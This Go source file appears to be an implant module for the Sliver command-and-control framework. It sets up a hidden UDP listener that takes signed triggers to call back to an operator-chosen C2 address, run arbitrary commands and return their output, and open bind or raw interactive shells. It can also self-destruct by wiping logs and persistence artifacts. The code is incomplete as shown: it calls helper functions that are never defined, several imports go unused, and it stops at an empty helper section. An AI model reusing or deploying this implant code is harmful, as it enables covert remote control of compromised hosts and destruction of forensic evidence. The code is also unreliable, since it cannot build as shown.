package triggerwake

/*
	Sliver Implant Framework
	Copyright (C) 2026  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	------------------------------------------------------------------------

	Package triggerwake is the IMPLANT-side passive UDP listener for
	signed wake / self-destruct / bind triggers. Unlike the server-side
	listener (which dispatches into operator-configurable handlers),
	this implant-side variant has a FIXED, hardcoded task set:

	  "wake"          -> transports.WakeNow(info)  (callback session)
	  "bind"          -> open listener, auth+encrypt, transports.WakeNow
	                     (bind session: server connects to implant)
	  "self-destruct" -> burn.Now()            (initiates self-destruct)
	  "exec"          -> run command, return output over UDP

	The task set is fixed by design: the implant runs in hostile
	environments and shouldn't be configurable post-build. Whatever
	tasks the operator wants this implant to respect get baked in
	at build time. Adding new task kinds = adding a case to the
	switch in handleAcceptedTrigger below.

	Template-directive gated (Sliver convention). The package is only
	imported when the IncludeTriggerWake field on ImplantConfig is
	true; the transport's bind address and HMAC secret come from
	the TriggerWakeBindAddr and TriggerWakeSecret fields via template
	render at build time. NO build tags. NO -X ldflags injection.

	Footprint note: this package imports github.com/0x90pkt/trigger/
	pkg/protocol, which transitively imports encoding/json. That adds
	~150-300 KB to the implant binary. Task #23 tracks replacing
	the JSON path with a hand-rolled minimal tokenizer for the implant
	build only — deferred to a follow-up commit.
*/

import (
	"bytes"
	"context"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"net/url"
	"os/exec"
	"strconv"
	"strings"
	"sync"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/0x90pkt/trigger/pkg/protocol"
	kcp "github.com/xtaci/kcp-go/v5"
	"golang.org/x/crypto/chacha20poly1305"

	"github.com/bishopfox/sliver/implant/sliver/burn"
	"github.com/bishopfox/sliver/implant/sliver/transports"
)

// Config is the implant-side triggerwake configuration. Populated at
// build time via template directives in main.go / runner.go that
// reference .Config.TriggerWakeBindAddr / .Config.TriggerWakeSecret.
type Config struct {
	// BindAddr is the host:port UDP listen address.
	BindAddr string
	// Secret is the HMAC-SHA256 key for verifying incoming triggers.
	Secret []byte
	// AllowedClientIDs, if non-empty, restricts which client_id values
	// the implant accepts. Empty = any signed client.
	AllowedClientIDs []string
	// MaxClockSkew bounds timestamp vs wall-clock drift. Default 45s.
	MaxClockSkew time.Duration
	// ReplayWindow is the replay-cache TTL. Default 5 min.
	ReplayWindow time.Duration

	// BurnExtraPaths is the list of filesystem paths the implant will
	// wipe on a self-destruct trigger. Typically: known logs, drop
	// files, scratch dirs, the implant's own audit cache. Hardcoded
	// at build time so the operator's bind doesn't influence what
	// gets wiped at runtime.
	BurnExtraPaths []string

	// BurnPersistence is the list of platform-specific persistence
	// artifacts (systemd unit paths, registry keys, launchd plists)
	// the implant will scrub on self-destruct.
	BurnPersistence []string

	// ClientID is the identifier sent in exec response frames. Set at
	// build time to distinguish implant instances. Defaults to "implant".
	ClientID string
}

// Start spawns the listener and returns a stop function. Idempotent
// in the sense that calling stop multiple times is safe; calling
// Start twice produces two independent listeners (caller's problem).
//
// The implant's main loop calls this once during startup when the
// IncludeTriggerWake field on ImplantConfig is true.
//
// Errors during bind are returned synchronously. Errors during the
// receive loop are logged (under the Debug template gate) and the loop
// continues — a transient I/O error must not knock the implant's
// wake/burn channel offline.
func Start(parent context.Context, cfg Config) (stop func(), err error) {
	if cfg.BindAddr == "" {
		return nil, errBindAddrEmpty
	}
	if len(cfg.Secret) == 0 {
		return nil, errSecretEmpty
	}
	if cfg.MaxClockSkew <= 0 {
		cfg.MaxClockSkew = 45 * time.Second
	}
	if cfg.ReplayWindow <= 0 {
		cfg.ReplayWindow = 5 * time.Minute
	}
	if cfg.ClientID == "" {
		cfg.ClientID = "implant"
	}

	addr, err := net.ResolveUDPAddr("udp", cfg.BindAddr)
	if err != nil {
		return nil, err
	}
	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		return nil, err
	}

	ctx, cancel := context.WithCancel(parent)
	replay := newReplayCache(cfg.ReplayWindow)

	go func() {
		<-ctx.Done()
		_ = conn.Close()
	}()

	go func() {
		buf := make([]byte, 8192)
		for {
			_ = conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
			n, remote, err := conn.ReadFromUDP(buf)
			if err != nil {
				select {
				case <-ctx.Done():
					return
				default:
					if isTimeout(err) {
						continue
					}
					// {{if .Config.Debug}}
					log.Printf("[triggerwake] read error: %v", err)
					// {{end}}
					continue
				}
			}
			payload := make([]byte, n)
			copy(payload, buf[:n])
			handlePacket(payload, remote, &cfg, replay, conn)
		}
	}()

	return cancel, nil
}

// handlePacket runs the per-packet validation pipeline. Modifies the
// replay cache. For bidirectional intents (exec), sends a signed
// response back to the remote via conn.
func handlePacket(payload []byte, remote *net.UDPAddr, cfg *Config, replay *replayCache, conn *net.UDPConn) {
	// Skip response frames -- we only process inbound trigger messages.
	if protocol.IsResponse(payload) {
		return
	}

	msg, err := protocol.DecodeWire(payload)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] decode failed from %v: %v", remote, err)
		// {{end}}
		return
	}

	if len(cfg.AllowedClientIDs) > 0 {
		var ok bool
		for _, allowed := range cfg.AllowedClientIDs {
			if allowed == msg.ClientID {
				ok = true
				break
			}
		}
		if !ok {
			// {{if .Config.Debug}}
			log.Printf("[triggerwake] client_id %q not allowed", msg.ClientID)
			// {{end}}
			return
		}
	}

	// Timestamp skew.
	msgTime, err := protocol.ParseTimestamp(msg.Timestamp)
	if err != nil {
		return
	}
	now := time.Now().UTC()
	skew := now.Sub(msgTime)
	if skew < 0 {
		skew = -skew
	}
	if skew > cfg.MaxClockSkew {
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] clock skew too large: %v", skew)
		// {{end}}
		return
	}

	// HMAC verify (constant-time via hmac.Equal).
	ok, err := verifyHMAC(msg, cfg.Secret)
	if err != nil || !ok {
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] HMAC verify failed for %v: %v", remote, err)
		// {{end}}
		return
	}

	// Replay.
	if !replay.markIfNew(msg.Nonce, now) {
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] replay nonce %s", msg.Nonce)
		// {{end}}
		return
	}

	// Authenticated signal received — reset the TTL countdown so an
	// actively-used implant never self-destructs. burn.ResetTTL() is
	// a no-op when TTL is disabled (the channel exists but nobody reads it).
	burn.ResetTTL()

	// Dispatch to fixed task set.
	switch msg.Intent {
	case "wake":
		// Payload format (backward compatible):
		//   ""                         -> no preference, use baked-in C2 list
		//   "mtls"                     -> transport hint only, use baked-in C2 list
		//   "mtls://10.0.0.5:8888"     -> dynamic callback: connect to this address
		//
		// When the payload contains "://", it's a full C2 URL specifying a
		// dynamic callback target. The scheme is extracted as the transport
		// hint, and the full URL is passed as a temporary C2 override. This
		// allows the operator to specify the callback address at wake time
		// rather than at build time — useful for dynamic infrastructure.
		// Security: the payload is covered by the HMAC signature, so only
		// an operator with the shared secret can set the callback target.
		info := parseWakePayload(msg.Payload)
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] wake triggered by %s (transport=%q callback=%q)", msg.ClientID, info.TransportHint, info.CallbackURL)
		// {{end}}
		transports.WakeNow(info)
	case "self-destruct":
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] self-destruct triggered by %s", msg.ClientID)
		// {{end}}
		go burn.Now(burn.Options{
			Reason:      burn.ReasonOperatorTriggered,
			ExtraPaths:  cfg.BurnExtraPaths,
			Persistence: cfg.BurnPersistence,
		})
	case "exec":
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] exec triggered by %s: %q", msg.ClientID, msg.Payload)
		// {{end}}
		select {
		case execSem <- struct{}{}:
			go func() {
				defer func() { <-execSem }()
				handleExec(msg, remote, cfg, conn)
			}()
		default:
			// at max concurrent exec capacity, drop
		}
	case "bind":
		// Payload format:
		//   "tcp:5555"             -> TCP bind on 0.0.0.0:5555
		//   "udp:5555"             -> UDP bind on 0.0.0.0:5555
		//   "tcp:0"                -> TCP on random ephemeral port
		//   "tcp:192.168.1.5:5555" -> TCP on specific interface
		//   ""                     -> TCP on random ephemeral port (default)
		//
		// TCP: opens listener, reports port via UDP response, then
		//   hands listener to the runner via WakeInfo for full Sliver
		//   session establishment (yamux + signed envelopes).
		// UDP: raw interactive shell (yamux can't run over datagrams).
		bOpts := parseBindPayload(msg.Payload)
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] bind triggered by %s (proto=%s addr=%s)", msg.ClientID, bOpts.Protocol, bOpts.BindAddr)
		// {{end}}
		select {
		case bindSem <- struct{}{}:
			go func() {
				defer func() { <-bindSem }()
				handleBind(bOpts, msg, remote, cfg, conn)
			}()
		default:
			// {{if .Config.Debug}}
			log.Printf("[triggerwake] bind: max concurrent sessions reached, dropping")
			// {{end}}
		}
	default:
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] unknown task %q ignored", msg.Intent)
		// {{end}}
	}
}

// handleExec executes a command from the trigger payload and sends the
// output back to the operator as a signed UDP response. The command
// is split on whitespace (first token = binary, rest = args). Output
// is capped at maxExecOutputBytes to fit within a single UDP datagram.
//
// This is the implant side of the bidirectional trigger channel:
// operator sends intent=exec with payload="ls -la /tmp", implant
// runs it, sends stdout+stderr back to the operator's source address.
func handleExec(msg protocol.TriggerMessage, remote *net.UDPAddr, cfg *Config, conn *net.UDPConn) {
	cmdLine := strings.TrimSpace(msg.Payload)
	if cmdLine == "" {
		sendExecResponse(msg, remote, cfg, conn, 1, "", "empty payload")
		return
	}

	parts := strings.Fields(cmdLine)
	bin := parts[0]
	var args []string
	if len(parts) > 1 {
		args = parts[1:]
	}

	// {{if .Config.Debug}}
	log.Printf("[triggerwake] exec: bin=%s args=%v", bin, args)
	// {{end}}

	ctx, cancel := context.WithTimeout(context.Background(), execTimeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, bin, args...)
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()
	exitCode := 0
	var execErr string
	if err != nil {
		execErr = err.Error()
		if exitErr, ok := err.(*exec.ExitError); ok {
			exitCode = exitErr.ExitCode()
		} else {
			exitCode = -1
		}
	}

	// Combine stdout+stderr, cap at max size for UDP.
	output := stdout.String() + stderr.String()
	if len(output) > maxExecOutputBytes {
		output = output[:maxExecOutputBytes] + "\n... [truncated]"
	}

	sendExecResponse(msg, remote, cfg, conn, exitCode, output, execErr)
}

// sendExecResponse constructs and sends a signed TriggerResponse back
// to the operator. Best-effort: UDP send failures are logged but do
// not retry (fire-and-forget semantics match the trigger protocol).
func sendExecResponse(msg protocol.TriggerMessage, remote *net.UDPAddr, cfg *Config, conn *net.UDPConn, exitCode int, output string, execErr string) {
	nonce, err := protocol.GenerateNonce()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] exec response nonce error: %v", err)
		// {{end}}
		return
	}

	resp := protocol.TriggerResponse{
		Version:      protocol.ProtocolVersion,
		Type:         protocol.ResponseType,
		RequestNonce: msg.Nonce,
		ClientID:     cfg.ClientID,
		Nonce:        nonce,
		Timestamp:    protocol.NowUTC(),
		ExitCode:     exitCode,
		Output:       output,
		Error:        execErr,
	}

	sig, err := protocol.SignResponse(resp, string(cfg.Secret))
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] exec response sign error: %v", err)
		// {{end}}
		return
	}
	resp.Signature = sig

	data, err := protocol.EncodeResponse(resp)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] exec response encode error: %v", err)
		// {{end}}
		return
	}

	if _, err := conn.WriteToUDP(data, remote); err != nil {
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] exec response send error: %v", err)
		// {{end}}
	}
	// {{if .Config.Debug}}
	log.Printf("[triggerwake] exec response sent to %v (exit=%d, %d bytes)", remote, exitCode, len(data))
	// {{end}}
}

// execSem limits concurrent handleExec goroutines. Prevents an
// adversary (or a burst of legitimate exec triggers) from fork-bombing
// the implant host. Capped at 3 concurrent execs; excess packets are
// silently dropped.
var execSem = make(chan struct{}, 3)

const (
	// maxExecOutputBytes caps the response payload to stay within a
	// single UDP datagram. Conservative: 8192 - header overhead.
	maxExecOutputBytes = 7168
	// execTimeout is the maximum wall-clock time for a triggered exec.
	execTimeout = 30 * time.Second
)

// verifyHMAC re-computes the canonical-JSON HMAC over msg (sans
// signature) and constant-time compares to msg.Signature.
//
// We use the standalone protocol package's Sign() and hmac.Equal so
// the cryptographic behavior is byte-identical to the server-side
// listener — same canonical form, same HMAC scheme.
func verifyHMAC(msg protocol.TriggerMessage, secret []byte) (bool, error) {
	if msg.Signature == "" {
		return false, nil
	}
	// Pass through to the standalone protocol package's Sign so any
	// canonicalization change there propagates here automatically.
	expected, err := protocol.Sign(msg, string(secret))
	if err != nil {
		return false, err
	}
	return hmac.Equal([]byte(expected), []byte(msg.Signature)), nil
}

// replayCache is a tiny replay-nonce window. Sliver implants are
// memory-constrained; keep this small and bounded. maxEntries caps the
// number of tracked nonces to prevent memory exhaustion if an adversary
// floods the listener with unique nonces faster than TTL expiry purges
// them. When the cap is reached, new nonces are still accepted (we
// can't block legitimate triggers) but the oldest entry is evicted
// before insertion. Default cap: 512.
type replayCache struct {
	mu         sync.Mutex
	ttl        time.Duration
	maxEntries int
	seen       map[string]time.Time
}

const defaultMaxReplayEntries = 512

func newReplayCache(ttl time.Duration) *replayCache {
	return &replayCache{
		ttl:        ttl,
		maxEntries: defaultMaxReplayEntries,
		seen:       make(map[string]time.Time, 32),
	}
}

func (r *replayCache) markIfNew(nonce string, now time.Time) bool {
	r.mu.Lock()
	defer r.mu.Unlock()

	// Purge expired entries.
	for k, exp := range r.seen {
		if now.After(exp) {
			delete(r.seen, k)
		}
	}

	if _, exists := r.seen[nonce]; exists {
		return false
	}

	// Cap enforcement: if at capacity after expiry purge, evict the
	// oldest entry to make room. O(n) scan is acceptable for n<=512.
	if r.maxEntries > 0 && len(r.seen) >= r.maxEntries {
		var oldestKey string
		var oldestExp time.Time
		for k, exp := range r.seen {
			if oldestKey == "" || exp.Before(oldestExp) {
				oldestKey = k
				oldestExp = exp
			}
		}
		if oldestKey != "" {
			delete(r.seen, oldestKey)
		}
	}

	r.seen[nonce] = now.Add(r.ttl)
	return true
}

// isTimeout reports whether the error is a net.Error timeout. Used
// to ignore SetReadDeadline-driven timeouts in the receive loop.
func isTimeout(err error) bool {
	type timeoutErr interface{ Timeout() bool }
	if te, ok := err.(timeoutErr); ok {
		return te.Timeout()
	}
	return false
}

// Local errors kept package-private so the receive loop's logging
// can `errors.Is` them without exposing identity to dependent packages.
var (
	errBindAddrEmpty = simpleError("triggerwake: BindAddr is empty")
	errSecretEmpty   = simpleError("triggerwake: Secret is empty")
)

// Avoid importing the errors package for one-liners (footprint).
type simpleError string

func (e simpleError) Error() string { return string(e) }

// parseWakePayload extracts transport hint and optional dynamic callback
// URL from the wake trigger's payload field. Format:
//
//	""                       -> WakeInfo{}  (no preference)
//	"mtls"                   -> WakeInfo{TransportHint: "mtls"}
//	"mtls://10.0.0.5:8888"  -> WakeInfo{TransportHint: "mtls", CallbackURL: "mtls://10.0.0.5:8888"}
//
// The presence of "://" distinguishes a full callback URL from a bare
// transport hint. For URLs, the scheme doubles as the transport hint.
func parseWakePayload(payload string) transports.WakeInfo {
	payload = strings.TrimSpace(payload)
	if payload == "" {
		return transports.WakeInfo{}
	}

	// If it contains "://", treat as a full C2 callback URL.
	if strings.Contains(payload, "://") {
		u, err := url.Parse(payload)
		if err == nil && u.Scheme != "" && u.Host != "" {
			return transports.WakeInfo{
				TransportHint: u.Scheme,
				CallbackURL:   payload,
			}
		}
		// Malformed URL — fall through to treat as plain hint.
	}

	// Plain transport hint (backward compatible).
	return transports.WakeInfo{TransportHint: payload}
}

// ---------------------------------------------------------------------------
// Bind (TCP: full Sliver session via WakeInfo; UDP: raw shell)
// ---------------------------------------------------------------------------

// bindOpts holds the parsed configuration for a bind trigger.
type bindOpts struct {
	Protocol  string        // "tcp" or "udp"
	BindAddr  string        // host:port to listen on (port 0 = OS picks ephemeral)
	TTL       time.Duration // max time to wait for a connection (0 = default 30s)
	NoSession bool          // if true, UDP uses raw shell instead of KCP session
}

// bindSem limits concurrent bind goroutines. Capped at 2 — one active
// session plus one hot-spare. Prevents resource exhaustion.
var bindSem = make(chan struct{}, 2)

const (
	defaultBindHost = "0.0.0.0"
	// defaultBindTTL is the default time to wait for a connection on
	// the bind port before giving up and going dormant.
	defaultBindTTL = 30 * time.Second
	// udpBindBufSize is the datagram read buffer for UDP bind shells.
	udpBindBufSize = 65535
)

// parseBindPayload extracts protocol, bind address, TTL, and session
// mode from the trigger payload.
//
// Format: "proto:port[:key=value,...]"
// Examples:
//
//	"tcp:5555"                    -> TCP on port 5555, 30s TTL, session mode
//	"udp:0"                      -> UDP on random port, 30s TTL, session mode
//	"tcp:5555:ttl=120"           -> TCP on port 5555, 120s TTL
//	"udp:4444:nosession"         -> UDP raw shell (no KCP session)
//	"tcp:0:ttl=60,nosession"     -> TCP random port, 60s TTL, raw shell
//	""                           -> TCP on random port, defaults
func parseBindPayload(payload string) bindOpts {
	opts := bindOpts{
		Protocol: "tcp",
		BindAddr: fmt.Sprintf("%s:%d", defaultBindHost, 0),
		TTL:      defaultBindTTL,
	}

	payload = strings.TrimSpace(payload)
	if payload == "" {
		return opts
	}

	// Split on first ":"  ->  proto : rest
	parts := strings.SplitN(payload, ":", 2)
	proto := strings.ToLower(strings.TrimSpace(parts[0]))
	if proto != "tcp" && proto != "udp" {
		proto = "tcp"
		parts = []string{proto, payload}
	}
	opts.Protocol = proto

	if len(parts) < 2 || strings.TrimSpace(parts[1]) == "" {
		return opts
	}

	rest := strings.TrimSpace(parts[1])

	// Check for key=value options after the address portion.
	// Format: "port:key=val,key=val" or "host:port:key=val,key=val"
	// We need to detect where the address ends and options begin.
	// Options are recognized by containing "=" or being "nosession".
	addrPart := rest
	optsPart := ""

	// Try to find options by splitting from the right. If the last
	// colon-separated segment contains "=" or is "nosession", it's options.
	colonParts := strings.Split(rest, ":")
	if len(colonParts) >= 2 {
		lastPart := colonParts[len(colonParts)-1]
		if strings.Contains(lastPart, "=") || strings.Contains(strings.ToLower(lastPart), "nosession") {
			optsPart = lastPart
			addrPart = strings.Join(colonParts[:len(colonParts)-1], ":")
		}
	}

	// Parse address (port or host:port).
	if port, err := strconv.Atoi(addrPart); err == nil && port >= 0 && port <= 65535 {
		opts.BindAddr = fmt.Sprintf("%s:%d", defaultBindHost, port)
	} else if _, _, err := net.SplitHostPort(addrPart); err == nil {
		opts.BindAddr = addrPart
	}

	// Parse options.
	if optsPart != "" {
		for _, kv := range strings.Split(optsPart, ",") {
			kv = strings.TrimSpace(kv)
			if strings.HasPrefix(kv, "ttl=") {
				if secs, err := strconv.Atoi(strings.TrimPrefix(kv, "ttl=")); err == nil && secs > 0 {
					opts.TTL = time.Duration(secs) * time.Second
				}
			}
			if strings.ToLower(kv) == "nosession" {
				opts.NoSession = true
			}
			// "noconnect" is consumed server-side only (prevents
			// auto-connect). The implant ignores it — it always
			// opens the listener regardless.
		}
	}

	return opts
}

// handleBind dispatches to TCP or UDP bind handlers.
//
// TCP: Opens a listener, reports the port via UDP response, then hands
// the listener to the runner via WakeInfo for full Sliver session
// establishment (yamux + signed envelopes, appears in sessions table).
//
// UDP: Raw interactive shell (yamux can't run over datagrams). The
// shell is self-contained here — no WakeInfo, no session registration.
func handleBind(opts bindOpts, msg protocol.TriggerMessage, remote *net.UDPAddr, cfg *Config, triggerConn *net.UDPConn) {
	switch opts.Protocol {
	case "udp":
		handleBindUDP(opts, msg, remote, cfg, triggerConn)
	default:
		handleBindTCP(opts, msg, remote, cfg, triggerConn)
	}
}

// handleBindTCP opens a TCP listener, reports the actual address back
// to the operator, then hands the listener to the runner via WakeInfo.
// The runner accepts the connection and establishes a full Sliver
// session using yamux + signed envelopes (same protocol as mTLS).
//
// If the runner doesn't pick up the WakeInfo (channel full / coalesced),
// the listener is closed to avoid leaking the port.
func handleBindTCP(opts bindOpts, msg protocol.TriggerMessage, remote *net.UDPAddr, cfg *Config, triggerConn *net.UDPConn) {
	ln, err := net.Listen("tcp", opts.BindAddr)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] bind tcp listen failed on %s: %v", opts.BindAddr, err)
		// {{end}}
		sendBindResponse(msg, remote, cfg, triggerConn, "", err.Error())
		return
	}
	actualAddr := ln.Addr().String()
	// {{if .Config.Debug}}
	log.Printf("[triggerwake] bind tcp listening on %s (ttl=%s)", actualAddr, opts.TTL)
	// {{end}}

	// Set TTL deadline on the listener. If no one connects within
	// the TTL, Accept() returns an error and the port is closed.
	if tcpLn, ok := ln.(*net.TCPListener); ok {
		_ = tcpLn.SetDeadline(time.Now().Add(opts.TTL))
	}

	// Report the actual bind address back to the operator.
	sendBindResponse(msg, remote, cfg, triggerConn, fmt.Sprintf("tcp://%s", actualAddr), "")

	// Hand the listener to the runner for session establishment.
	info := transports.WakeInfo{
		BindMode:     true,
		BindListener: ln,
		BindSecret:   cfg.Secret,
	}
	select {
	case transports.WakeNowChan() <- info:
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] bind tcp: listener handed to runner")
		// {{end}}
	default:
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] bind tcp: wake channel full, closing listener")
		// {{end}}
		_ = ln.Close()
	}
}

// handleBindUDP handles UDP bind triggers. Default behavior opens a
// KCP reliable listener and hands it to the runner for a full Sliver
// session (same as TCP bind, but over UDP via KCP reliability layer).
//
// With --no-session (opts.NoSession=true), falls back to an encrypted
// raw interactive shell over UDP datagrams.
func handleBindUDP(opts bindOpts, msg protocol.TriggerMessage, remote *net.UDPAddr, cfg *Config, triggerConn *net.UDPConn) {
	if opts.NoSession {
		handleBindUDPRawShell(opts, msg, remote, cfg, triggerConn)
		return
	}
	handleBindUDPSession(opts, msg, remote, cfg, triggerConn)
}

// handleBindUDPSession opens a KCP reliable listener over UDP, reports
// the port, then hands the KCP listener to the runner via WakeInfo for
// full Sliver session establishment. KCP provides reliable ordered
// delivery over UDP — yamux + envelopes run on top.
func handleBindUDPSession(opts bindOpts, msg protocol.TriggerMessage, remote *net.UDPAddr, cfg *Config, triggerConn *net.UDPConn) {
	// KCP listener with no block cipher (we handle encryption ourselves
	// in the auth+encrypt layer above yamux). FEC disabled (0,0).
	kcpLn, err := kcp.ListenWithOptions(opts.BindAddr, nil, 0, 0)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] bind udp/kcp listen failed on %s: %v", opts.BindAddr, err)
		// {{end}}
		sendBindResponse(msg, remote, cfg, triggerConn, "", err.Error())
		return
	}
	actualAddr := kcpLn.Addr().String()
	// {{if .Config.Debug}}
	log.Printf("[triggerwake] bind udp/kcp listening on %s (ttl=%s)", actualAddr, opts.TTL)
	// {{end}}

	// Set TTL deadline.
	_ = kcpLn.SetDeadline(time.Now().Add(opts.TTL))

	// Report the actual bind address back to the operator.
	sendBindResponse(msg, remote, cfg, triggerConn, fmt.Sprintf("udp://%s", actualAddr), "")

	// KCP listener implements net.Listener, so it feeds directly into
	// BindSessionConnect (same auth + crypto + yamux pipeline as TCP).
	info := transports.WakeInfo{
		BindMode:     true,
		BindListener: kcpLn,
		BindSecret:   cfg.Secret,
	}
	select {
	case transports.WakeNowChan() <- info:
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] bind udp/kcp: listener handed to runner")
		// {{end}}
	default:
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] bind udp/kcp: wake channel full, closing listener")
		// {{end}}
		_ = kcpLn.Close()
	}
}

// handleBindUDPRawShell opens an encrypted raw UDP shell. Used with
// --no-session. Self-contained — no WakeInfo, no session registration.
//
// Security:
//   - HMAC-SHA256 challenge-response over first datagram exchange
//   - ChaCha20-Poly1305 per-datagram encryption after auth
//   - Peer-locked to the authenticated source address
//
// Datagram auth handshake:
//  1. Implant sends 32-byte nonce as first datagram (to first peer)
//  2. Client responds with 32-byte HMAC-SHA256(nonce, secret)
//  3. Implant verifies → derive AEAD, peer is authenticated
//  4. All subsequent datagrams: [12-byte nonce] [ciphertext + tag]
func handleBindUDPRawShell(opts bindOpts, msg protocol.TriggerMessage, remote *net.UDPAddr, cfg *Config, triggerConn *net.UDPConn) {
	addr, err := net.ResolveUDPAddr("udp", opts.BindAddr)
	if err != nil {
		sendBindResponse(msg, remote, cfg, triggerConn, "", err.Error())
		return
	}
	bindConn, err := net.ListenUDP("udp", addr)
	if err != nil {
		sendBindResponse(msg, remote, cfg, triggerConn, "", err.Error())
		return
	}
	defer bindConn.Close()

	actualAddr := bindConn.LocalAddr().String()
	// {{if .Config.Debug}}
	log.Printf("[triggerwake] bind udp encrypted raw shell listening on %s", actualAddr)
	// {{end}}

	sendBindResponse(msg, remote, cfg, triggerConn, fmt.Sprintf("udp://%s", actualAddr), "")

	// --- Auth handshake over UDP datagrams ---

	// Wait for first datagram from any peer (this is the "hello").
	buf := make([]byte, udpBindBufSize)
	_, peerAddr, rerr := bindConn.ReadFromUDP(buf)
	if rerr != nil {
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] bind udp raw: initial read failed: %v", rerr)
		// {{end}}
		return
	}
	// {{if .Config.Debug}}
	log.Printf("[triggerwake] bind udp raw: peer candidate %s, starting auth", peerAddr)
	// {{end}}

	// Generate 32-byte nonce and send it to the peer.
	nonce := make([]byte, 32)
	if _, err := cryptoRand.Read(nonce); err != nil {
		return
	}
	if _, err := bindConn.WriteToUDP(nonce, peerAddr); err != nil {
		return
	}

	// Read HMAC response from peer.
	_ = bindConn.SetReadDeadline(time.Now().Add(10 * time.Second))
	n, from, err := bindConn.ReadFromUDP(buf)
	_ = bindConn.SetReadDeadline(time.Time{})
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] bind udp raw: auth response read failed: %v", err)
		// {{end}}
		return
	}
	if !from.IP.Equal(peerAddr.IP) || from.Port != peerAddr.Port {
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] bind udp raw: auth response from wrong peer %s", from)
		// {{end}}
		return
	}
	if n != 32 {
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] bind udp raw: auth response wrong size %d", n)
		// {{end}}
		return
	}

	// Verify HMAC-SHA256(nonce, secret).
	mac := hmacSHA256(nonce, cfg.Secret)
	if !hmacEqual(buf[:n], mac) {
		// {{if .Config.Debug}}
		log.Printf("[triggerwake] bind udp raw: auth FAILED from %s", peerAddr)
		// {{end}}
		return
	}
	// {{if .Config.Debug}}
	log.Printf("[triggerwake] bind udp raw: auth OK from %s, deriving encryption key", peerAddr)
	// {{end}}

	// Derive ChaCha20-Poly1305 AEAD.
	keyHash := sha256Hash(cfg.Secret, nonce, []byte("bind-session-v1"))
	aead, err := chacha20poly1305.New(keyHash[:])
	if err != nil {
		return
	}

	// --- Encrypted raw shell ---

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	shell := defaultShellPath()
	args := defaultShellArgs()
	cmd := exec.CommandContext(ctx, shell, args...)

	stdinPipe, err := cmd.StdinPipe()
	if err != nil {
		return
	}
	stdoutPipe, err := cmd.StdoutPipe()
	if err != nil {
		return
	}
	cmd.Stderr = cmd.Stdout

	if err := cmd.Start(); err != nil {
		return
	}

	var wg sync.WaitGroup
	var readSeq, writeSeq uint64

	// Encrypted UDP -> shell stdin
	wg.Add(1)
	go func() {
		defer wg.Done()
		defer stdinPipe.Close()
		readBuf := make([]byte, udpBindBufSize)
		for {
			select {
			case <-ctx.Done():
				return
			default:
			}
			_ = bindConn.SetReadDeadline(time.Now().Add(30 * time.Second))
			rn, from, err := bindConn.ReadFromUDP(readBuf)
			if err != nil {
				if isTimeout(err) {
					continue
				}
				return
			}
			if !from.IP.Equal(peerAddr.IP) || from.Port != peerAddr.Port {
				continue
			}
			// Decrypt datagram.
			plaintext, _, decErr := decryptDatagram(aead, readBuf[:rn])
			if decErr != nil {
				// {{if .Config.Debug}}
				log.Printf("[triggerwake] bind udp raw: decrypt failed: %v", decErr)
				// {{end}}
				continue // drop corrupt datagram, don't kill session
			}
			_ = readSeq // tracked for future replay protection
			if _, werr := stdinPipe.Write(plaintext); werr != nil {
				return
			}
		}
	}()

	// Shell stdout -> encrypted UDP
	wg.Add(1)
	go func() {
		defer wg.Done()
		outBuf := make([]byte, udpBindBufSize-128) // leave room for nonce+tag
		for {
			rn, err := stdoutPipe.Read(outBuf)
			if rn > 0 {
				encrypted := encryptDatagram(aead, writeSeq, outBuf[:rn])
				writeSeq += 2 // even sequence for server (implant) writes
				_, _ = bindConn.WriteToUDP(encrypted, peerAddr)
			}
			if err != nil {
				return
			}
		}
	}()

	_ = cmd.Wait()
	cancel()
	wg.Wait()

	// {{if .Config.Debug}}
	log.Printf("[triggerwake] bind udp encrypted raw shell ended (peer=%s)", peerAddr)
	// {{end}}
}

// sendBindResponse sends the actual bind address back to the operator
// via a signed UDP response (same wire format as exec responses). This
// is essential when port 0 was requested — the operator needs to know
// what port the OS assigned.
func sendBindResponse(msg protocol.TriggerMessage, remote *net.UDPAddr, cfg *Config, conn *net.UDPConn, bindAddr string, errMsg string) {
	exitCode := 0
	if errMsg != "" {
		exitCode = 1
	}
	sendExecResponse(msg, remote, cfg, conn, exitCode, bindAddr, errMsg)
}

// --- Inline crypto helpers for UDP raw shell ---
